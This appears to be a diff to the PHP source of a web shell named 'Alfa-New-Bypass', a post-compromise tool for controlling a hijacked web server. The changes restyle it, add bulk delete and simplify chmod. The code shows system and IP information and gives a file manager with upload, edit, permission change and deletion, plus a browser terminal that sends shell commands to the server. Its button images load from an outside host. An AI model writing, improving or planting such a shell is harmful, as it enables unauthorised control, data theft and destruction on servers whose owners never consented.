+    0 0 10px rgba(35,232,90,.22);   /* glow tipis, nggak silau */
+}
+.btn-apply:hover{
+  transform: translateY(-1px);
+  filter: brightness(1.04);
+}
+
+/* DEL — maroon neon, ukuran sama */
+.del-link{
+  background: linear-gradient(180deg, #8a0020 0%, #5a0016 100%);
+  border:1px solid #b0002e;
+  box-shadow:
+    0 0 0 2px rgba(176,0,46,.18),
+    0 6px 18px rgba(0,0,0,.35),
+    inset 0 0 0 1px rgba(255,255,255,.06),
+    0 0 10px rgba(176,0,46,.22);
+}
+.del-link:hover{
+  transform: translateY(-1px);
+  filter: brightness(1.04);
+}
+
+
+/* Responsif (opsional) */
+@media (max-width:1600px){ .fm-grid{ grid-template-columns:repeat(4, 300px); } }
+@media (max-width:1250px){ .fm-grid{ grid-template-columns:repeat(3, 300px); } }
+@media (max-width:950px) { .fm-grid{ grid-template-columns:repeat(2, 300px); } }
+@media (max-width:640px) { .fm-grid{ grid-template-columns:1fr; } }
+
 </style>
 </head>
 <body>
 
 <div class='sysinfo'>
-<h2>System Information</h2>
+<h2 style="font-size: 36px; line-height:1.2; margin:0 0 .5rem">
+  Alfa-New-Bypass
+</h2>
 <table>
 <tr><td>Uname:</td><td><?=htmlspecialchars($uname)?></td></tr>
-<tr><td>User:</td><td><?=$userInfo['uid']?> [ <?=$userInfo['name']?> ] Group: <?=$groupInfo['gid']?> [ <?=$groupInfo['name']?> ]</td></tr>
+<tr><td>User:</td><td><?=(isset($userInfo['uid'])?$userInfo['uid']:'-')?> [ <?=(isset($userInfo['name'])?$userInfo['name']:'-')?> ] Group: <?=(isset($groupInfo['gid'])?$groupInfo['gid']:'-')?> [ <?=(isset($groupInfo['name'])?$groupInfo['name']:'-')?> ]</td></tr>
 <tr><td>PHP:</td><td><?=$phpVersion?> &nbsp; Safe Mode: <?=$safeMode?></td></tr>
 <tr><td>ServerIP:</td><td><?=$serverIP?> &nbsp; Your IP: <?=$clientIP?></td></tr>
 <tr><td>DateTime:</td><td><?=$dateTime?></td></tr>
@@ -382,29 +942,39 @@ td a.file::before   { content: "📄"; margin-right: 8px; font-size: 1.15rem; cu
 </table>
 </div>
 
-<h2>File Manager & Shell</h2>
-
 <div style="margin-bottom: 1rem; user-select: text; font-family: monospace; font-size: 0.95rem; white-space: nowrap;">
   <span style="color: #999;">PWD:&nbsp;&nbsp;</span>
   <?php
-  $crumbs = explode(DIRECTORY_SEPARATOR, $path);
+  $crumbs   = explode(DIRECTORY_SEPARATOR, $path);
   $tmp_path = '';
 
-  echo '<a href="?path=' . urlencode(DIRECTORY_SEPARATOR) . '" style="color: #61dafb; text-decoration: none;">/</a>';
+  // Tampilkan root sekali saja
+  echo '<a href="?path=' . urlencode(DIRECTORY_SEPARATOR) . '" style="color:#00FF00; text-decoration:none;">/</a>';
 
+  $first = true;
   foreach ($crumbs as $crumb) {
       if ($crumb === '' || $crumb === '.') continue;
       $tmp_path .= DIRECTORY_SEPARATOR . $crumb;
-      echo '<span style="color:#555;">/</span>';
-      echo '<a href="?path=' . urlencode($tmp_path) . '" style="color: #61dafb; text-decoration: none;">' . htmlspecialchars($crumb) . '</a>';
-  }
-  echo '<span style="color:#555;">/</span>';
-  ?>
 
-  <a href="?path=<?= urlencode($initial_path) ?>" style="color: red; font-weight: 700; text-decoration: none; margin-left: 10px;">
+      // Tambahkan slash HANYA sebelum crumb ke-2 dst (bukan sebelum yang pertama)
+      if (!$first) {
+          echo '<span style="color:#00FF00;">/</span>';
+      }
+
+      echo '<a href="?path=' . urlencode($tmp_path) . '" style="color:#00FF00; text-decoration:none;">'
+         . htmlspecialchars($crumb) . '</a>';
+
+      $first = false;
+  }
+
+  // trailing slash di akhir path
+  echo '<span style="color:#00FF00;">/</span>';
+  ?>
+  <a href="?path=<?= urlencode($initial_path) ?>" style="color:#ff0000; font-weight:700; text-decoration:none; margin-left:10px;">
     [ Home Shell ]
   </a>
 </div>
+
 
 <?php if (!empty($msg_error)) : ?>
   <p style="color: #e74c3c; padding: 8px 12px; background: #1e1e1e; border-radius: 4px;"><?=htmlspecialchars($msg_error)?></p>
@@ -413,51 +983,84 @@ td a.file::before   { content: "📄"; margin-right: 8px; font-size: 1.15rem; cu
   <p style="color: #4caf50; padding: 8px 12px; background: #1e1e1e; border-radius: 4px;"><?=htmlspecialchars($msg_success)?></p>
 <?php endif; ?>
 
-<form class="actions-container" method="post" enctype="multipart/form-data">
-  <label class="actions-label">
-    Make File:
-    <input type="text" name="make_file" placeholder="New filename" autocomplete="off" />
-  </label>
-  <input type="submit" name="make_file_submit" value="Create File" class="btn-primary" />
-
-  <label class="actions-label">
-    Make Dir:
-    <input type="text" name="make_dir" placeholder="New directory name" autocomplete="off" />
-  </label>
-  <input type="submit" name="make_dir_submit" value="Create Directory" class="btn-primary" />
-
-  <label class="actions-label" style="flex-grow: 1; min-width: 220px;">
-    Upload File:
-    <input type="file" name="file" />
-  </label>
-  <input type="submit" value="Upload" class="btn-primary" />
-
-  <label class="actions-label" style="min-width: 220px;">
-    Change Dir:
-    <input type="text" name="change_dir" placeholder="Target path" autocomplete="off" />
-  </label>
-  <input type="submit" name="change_dir_submit" value="Change Directory" class="btn-primary" />
-  
-  <div style="display: flex; align-items: flex-end;">
-    <button type="button" id="openTerminalBtn" class="btn-primary">Open Terminal</button>
+<form class="actions-container fm-grid" method="post" enctype="multipart/form-data">
+  <!-- Make File -->
+  <div class="fm-row">
+    <label>Make File :</label>
+    <div class="fm-inputwrap">
+      <input type="text" name="make_file" placeholder="New filename" autocomplete="off">
+      <button type="submit" name="make_file_submit" class="fm-iconbtn">
+        <img src="https://solevisible.com/images/btn.png" alt="Create File">
+      </button>
+    </div>
   </div>
+
+  <!-- Make Dir -->
+  <div class="fm-row">
+    <label>Make Dir :</label>
+    <div class="fm-inputwrap">
+      <input type="text" name="make_dir" placeholder="New directory name" autocomplete="off">
+      <button type="submit" name="make_dir_submit" class="fm-iconbtn">
+        <img src="https://solevisible.com/images/btn.png" alt="Create Dir">
+      </button>
+    </div>
+  </div>
+
+  <!-- Upload File -->
+  <div class="fm-row">
+    <label>Upload File :</label>
+    <div class="fm-inputwrap">
+      <input type="file" name="file">
+      <button type="submit" class="fm-iconbtn">
+        <img src="https://solevisible.com/images/btn.png" alt="Upload">
+      </button>
+    </div>
+  </div>
+
+  <!-- Change Dir -->
+  <div class="fm-row">
+    <label>Change Dir :</label>
+    <div class="fm-inputwrap">
+      <input type="text" name="change_dir" placeholder="Target path" autocomplete="off">
+      <button type="submit" name="change_dir_submit" class="fm-iconbtn">
+        <img src="https://solevisible.com/images/btn.png" alt="Change Dir">
+      </button>
+    </div>
+  </div>
+
+<div class="fm-row">
+  <label>Open Terminal :</label>
+  <div class="fm-inputwrap">
+    <span id="openTerminalDummy" class="fm-dummy" aria-hidden="true"></span>
+    <button type="button" id="openTerminalBtn" class="fm-iconbtn btn-primary" aria-label="Open Terminal">
+      <img src="https://solevisible.com/images/btn.png" alt="">
+    </button>
+  </div>
+</div>
 </form>
 
-<table>
+
+
+<form id="bulkForm" method="post" action="?path=<?= urlencode($path) ?>">
+<table id="fileTable">
 <thead>
 <tr>
-<th>Name</th>
-<th>Size</th>
-<th>Owner</th>
-<th>Group</th>
-<th>Perm</th>
-<th>Created</th>
-<th>Actions</th>
+  <th style="width:28px;"><input type="checkbox" id="checkAll"></th>
+  <th>Name</th>
+  <th>Size</th>
+  <th>Owner</th>
+  <th>Group</th>
+  <th>Permissions</th>
+  <th>Created</th>
+  <th>Actions</th>
 </tr>
 </thead>
 <tbody>
+
+
 <?php
-$itemsRaw = scandir($path);
+$itemsRaw = @scandir($path);
+if ($itemsRaw === false) $itemsRaw = [];
 $folders = [];
 $filesList = [];
 foreach ($itemsRaw as $it) {
@@ -468,70 +1071,110 @@ foreach ($itemsRaw as $it) {
 }
 natcasesort($folders);
 natcasesort($filesList);
+
 $files = array_merge($folders, $filesList);
 
 foreach ($files as $file) {
     $full = $path . DIRECTORY_SEPARATOR . $file;
-    $is_dir = is_dir($full);
     if ($file === '.' || $file === '..' || $file === '' || $file === null) continue;
 
-    $size = $is_dir ? '-' : human_filesize(filesize($full));
+    $is_dir = is_dir($full);
+    $size = $is_dir ? '-' : (is_file($full) ? human_filesize(@filesize($full)) : '-');
     list($user, $group) = getUserGroup($full);
-    $perm_sym = formatPerm(fileperms($full));
-    $perm_octal = permOctal(fileperms($full));
+    $perm_sym     = @formatPerm(@fileperms($full));
+    $perm_octal   = @permOctal(@fileperms($full));
     $perm_display = $perm_octal . ' >> ' . $perm_sym;
     $created_date = @filectime($full) ? date('Y-m-d H:i:s', filectime($full)) : '-';
-    $name_esc = htmlspecialchars($file);
+    $name_esc     = htmlspecialchars($file);
 
-    echo '<tr>';
+    // Cek izin untuk pewarnaan kolom Permission saja
+    $can_read  = @is_readable($full);
+    $can_write = @is_writable($full);
+    $can_exec  = @is_executable($full);
+
     if ($is_dir) {
-        echo '<td><a href="?path=' . urlencode($full) . '" class="folder">' . $name_esc . '</a></td>';
+        if ($can_read && $can_write && $can_exec)      $color_perm = '#4CAF50';
+        elseif ($can_read)                              $color_perm = '#ffffff';
+        else                                            $color_perm = '#e74c3c';
     } else {
-        $view_link = '?path=' . urlencode($path) . '&view=' . urlencode($file);
-        echo '<td><a href="' . $view_link . '" class="file" data-full="' . htmlspecialchars($full, ENT_QUOTES) . '">' . $name_esc . '</a></td>';
+        if ($can_read && $can_write)                    $color_perm = '#4CAF50';
+        elseif ($can_read)                              $color_perm = '#ffffff';
+        else                                            $color_perm = '#e74c3c';
     }
 
+    echo '<tr>';
+
+    // 1) Kolom checkbox (paling kiri)
+    echo '<td style="width:28px;text-align:center;">
+            <input type="checkbox" class="chk" name="sel[]" value="' . htmlspecialchars($file, ENT_QUOTES) . '">
+          </td>';
+
+    // 2) Kolom NAME (tetap putih, folder & file)
+    if ($is_dir) {
+        echo '<td><span style="color:#61dafb;">📁</span> '
+           . '<a href="?path=' . urlencode($full) . '" class="folder" style="color:#fff;">'
+           . $name_esc . '</a></td>';
+    } else {
+        $icon_url  = htmlspecialchars(get_file_icon($file, $file_icons));
+        $view_link = '?path=' . urlencode($path) . '&view=' . urlencode($file);
+        echo '<td><img src="' . $icon_url . '" class="fileicon" alt="icon"> '
+           . '<a href="' . $view_link . '" class="file" data-full="' . htmlspecialchars($full, ENT_QUOTES) . '" style="color:#fff;">'
+           . $name_esc . '</a></td>';
+    }
+
+    // 3) Kolom lainnya
     echo '<td>' . $size . '</td>';
     echo '<td>' . htmlspecialchars($user) . '</td>';
     echo '<td>' . htmlspecialchars($group) . '</td>';
-    
-    $color_perm = '#fff';
-    if (!$is_dir) {
-        $can_read = is_readable($full);
-        $can_write = is_writable($full);
 
-        if ($can_write) {
-            $color_perm = '#4CAF50';
-        } elseif ($can_read) {
-            $color_perm = '#fff';
-        } else {
-            $color_perm = '#e74c3c';
-        }
-    } else {
-        $color_perm = '#61dafb';
-    }
-
+    // 4) Kolom PERMISSIONS (hanya ini yang berubah warna)
     echo '<td><span title="Permission" style="color:' . $color_perm . ';">' . $perm_display . '</span></td>';
+
     echo '<td>' . htmlspecialchars($created_date) . '</td>';
 
-    echo '<td style="display:flex; gap:8px; align-items:center;">';
-    if (is_writable($full)) {
-        echo '<form class="form-chmod" method="post" action="?path=' . urlencode($path) . '">';
-        echo '<input type="hidden" name="chmod_file" value="' . htmlspecialchars($file) . '">';
-        echo '<input type="text" name="new_perm" value="' . $perm_octal . '" maxlength="4" pattern="[0-7]{3,4}" title="Octal format, e.g. 0644" required>';
-        echo '<input type="submit" value="Set">';
-        echo '</form>';
-    } else {
-        echo '<span class="small-muted">no-write</span>';
-    }
-    echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($file) . '" class="del-link" onclick="return confirm(\'Delete ' . addslashes($file) . '?\');">Del</a>';
-    echo '</td>';
+// 5) Actions (CHMOD minimal + Del) — TANPA form bersarang
+$digits3 = substr($perm_octal, -3); // contoh: 644
+
+echo '<td class="actions-td">';
+echo '  <div class="chmod-min">';
+echo '    <input type="text" class="perm3" value="' . $digits3 . '" '.
+     'name="perm[' . htmlspecialchars($file, ENT_QUOTES) . ']" '.
+     'maxlength="3" pattern="[0-7]{3}" title="3-digit octal, e.g. 644">';
+echo '    <button type="submit" class="btn-apply" name="chmod_file" '.
+     'value="' . htmlspecialchars($file, ENT_QUOTES) . '">Apply</button>';
+echo '  </div>';
+
+echo '  <a href="?path=' . urlencode($path) . '&delete=' . urlencode($file) .
+     '" class="del-link" onclick="return confirm(\'Delete ' . addslashes($file) . '?\');">Del</a>';
+echo '</td>';
+
+
+
 
     echo '</tr>';
 }
+
 ?>
+
 </tbody>
 </table>
+
+<div class="bulkbar">
+  <span id="bulkCount">0 selected</span>
+  <div class="bulk-actions">
+    <button type="button" id="invertSel" class="btn-secondary">Invert</button>
+    <button type="button" id="clearSel"  class="btn-secondary">Clear</button>
+    <button type="submit" name="bulk_delete" id="bulkDeleteBtn"
+            class="btn-primary danger"
+            onclick="return confirm('Delete selected items?');"
+            disabled>
+      Delete Selected
+    </button>
+  </div>
+</div>
+</form>
+
+
 
 <?php if ($file_view_content !== '') : ?>
   <h3>View/Edit File: <?=htmlspecialchars(basename($file_to_view_path))?></h3>
@@ -596,10 +1239,10 @@ foreach ($files as $file) {
     e.preventDefault();
     const cmd = terminalInput.value.trim();
     if (!cmd) return;
-    
+
     terminalOutput.value += `$ ${cmd}\n`;
     terminalInput.value = '';
-    
+
     fetch(window.location.pathname + '?path=<?=urlencode($path)?>', {
         method: 'POST',
         headers: { 
@@ -652,7 +1295,7 @@ foreach ($files as $file) {
       })
       .then(text => {
         editFileContentEl.value = text;
-        const parts = fullPath.split(/[\\/]/);
+        const parts = fullPath.split(/[\\\/]/);
         currentEditingFilenameOnly = parts[parts.length - 1];
         editFileNameEl.textContent = currentEditingFilenameOnly;
         editFileSizeEl.textContent = (new Blob([text]).size) + ' bytes';
@@ -710,6 +1353,175 @@ foreach ($files as $file) {
       editMsg.style.display = 'block';
     });
   });
+</script>
+<script>
+(function () {
+  const btn   = document.getElementById('openTerminalBtn');
+  const dummy = document.getElementById('openTerminalDummy');
+  if (btn && btn.tagName === 'BUTTON') btn.type = 'button'; // cegah submit form
+  if (dummy && btn) dummy.addEventListener('click', () => btn.click());
+})();
+</script>
+<script>
+(function () {
+  const bulkForm  = document.getElementById('bulkForm');
+  if (!bulkForm) return;
+
+  const checkAll  = document.getElementById('checkAll');
+  const countEl   = document.getElementById('bulkCount');
+  const delBtn    = document.getElementById('bulkDeleteBtn');
+  const invertBtn = document.getElementById('invertSel');
+  const clearBtn  = document.getElementById('clearSel');
+
+  const checks = () => Array.from(bulkForm.querySelectorAll('tbody input.chk'));
+
+  function updateUI() {
+    const all   = checks();
+    const on    = all.filter(c => c.checked);
+
+    // highlight baris
+    all.forEach(c => c.closest('tr')?.classList.toggle('selected', c.checked));
+
+    // counter & tombol delete
+    if (countEl) countEl.textContent = (on.length || 0) + ' selected';
+    if (delBtn)  delBtn.disabled = on.length === 0;
+
+    // status Select All
+    if (checkAll) {
+      checkAll.checked      = on.length > 0 && on.length === all.length;
+      checkAll.indeterminate = on.length > 0 && on.length < all.length;
+    }
+  }
+
+  // perubahan checkbox per baris
+  bulkForm.addEventListener('change', (e) => {
+    if (e.target?.classList.contains('chk')) updateUI();
+    if (e.target?.id === 'checkAll') {
+      checks().forEach(c => c.checked = checkAll.checked);
+      updateUI();
+    }
+  });
+
+  // Invert
+  invertBtn?.addEventListener('click', () => {
+    checks().forEach(c => c.checked = !c.checked);
+    updateUI();
+  });
+
+  // Clear
+  clearBtn?.addEventListener('click', () => {
+    if (checkAll) checkAll.checked = false;
+    checks().forEach(c => c.checked = false);
+    updateUI();
+  });
+
+  // init
+  updateUI();
+})();
+</script>
+<script>
+(function(){
+  const table    = document.getElementById('fileTable');
+  const checkAll = document.getElementById('checkAll');
+  const countEl  = document.getElementById('bulkCount');
+  const delBtn   = document.getElementById('bulkDeleteBtn');
+  const invertBtn= document.getElementById('invertSel');
+  const clearBtn = document.getElementById('clearSel');
+
+  function updateState(){
+    const checks = table.querySelectorAll('tbody input.chk');
+    let count = 0;
+    checks.forEach(chk => {
+      const tr = chk.closest('tr');
+      if (chk.checked){ tr.classList.add('selected'); count++; }
+      else            { tr.classList.remove('selected'); }
+    });
+    if (countEl) countEl.textContent = count + ' selected';
+    if (delBtn)  delBtn.disabled = (count === 0);
+
+    if (checkAll){
+      const all = checks.length && Array.from(checks).every(c => c.checked);
+      checkAll.checked = all;
+      checkAll.indeterminate = !all && count > 0;
+    }
+  }
+
+  if (checkAll){
+    checkAll.addEventListener('change', () => {
+      table.querySelectorAll('tbody input.chk').forEach(ch => ch.checked = checkAll.checked);
+      updateState();
+    });
+  }
+
+  table.addEventListener('change', e => {
+    if (e.target && e.target.classList.contains('chk')) updateState();
+  });
+
+  invertBtn?.addEventListener('click', () => {
+    table.querySelectorAll('tbody input.chk').forEach(ch => ch.checked = !ch.checked);
+    updateState();
+  });
+
+  clearBtn?.addEventListener('click', () => {
+    checkAll && (checkAll.checked = false);
+    table.querySelectorAll('tbody input.chk').forEach(ch => ch.checked = false);
+    updateState();
+  });
+
+  // init
+  updateState();
+})();
+<script>
+(function(){
+  const table = document.getElementById('fileTable');
+  if (!table) return;
+
+  function setHidden(wrap){
+    const oct = wrap.querySelector('.oct');
+    const hid = wrap.querySelector('.chmod-hidden');
+    if (oct && hid && /^[0-7]{3}$/.test(oct.value)) {
+      hid.value = '0' + oct.value;
+    }
+  }
+
+  table.addEventListener('change', function(e){
+    const el = e.target;
+    const wrap = el.closest('.chmod');
+    if (!wrap) return;
+
+    if (el.classList.contains('chmod-digit')) {
+      const digs = Array.from(wrap.querySelectorAll('.chmod-digit')).map(s => s.value);
+      wrap.querySelector('.oct').value = digs.join('');
+      setHidden(wrap);
+    }
+
+    if (el.classList.contains('oct')) {
+      el.value = el.value.replace(/[^0-7]/g,'').slice(0,3);
+      const v = el.value;
+      const sels = wrap.querySelectorAll('.chmod-digit');
+      if (v.length === 3) { sels[0].value=v[0]; sels[1].value=v[1]; sels[2].value=v[2]; }
+      setHidden(wrap);
+    }
+
+    if (el.classList.contains('preset')) {
+      if (el.value) {
+        const v = el.value.replace(/^0/,'');
+        wrap.querySelector('.oct').value = v;
+        const sels = wrap.querySelectorAll('.chmod-digit');
+        sels[0].value=v[0]; sels[1].value=v[1]; sels[2].value=v[2];
+        setHidden(wrap);
+      }
+    }
+  });
+
+  // Pastikan hidden terset saat tombol Apply diklik (sebelum submit)
+  table.addEventListener('click', function(e){
+    const btn = e.target.closest('button[data-apply="chmod"]');
+    if (!btn) return;
+    const wrap = btn.closest('.chmod');
+    if (wrap) setHidden(wrap);
+  });
+})();
 </script>
 </body>
 </html>
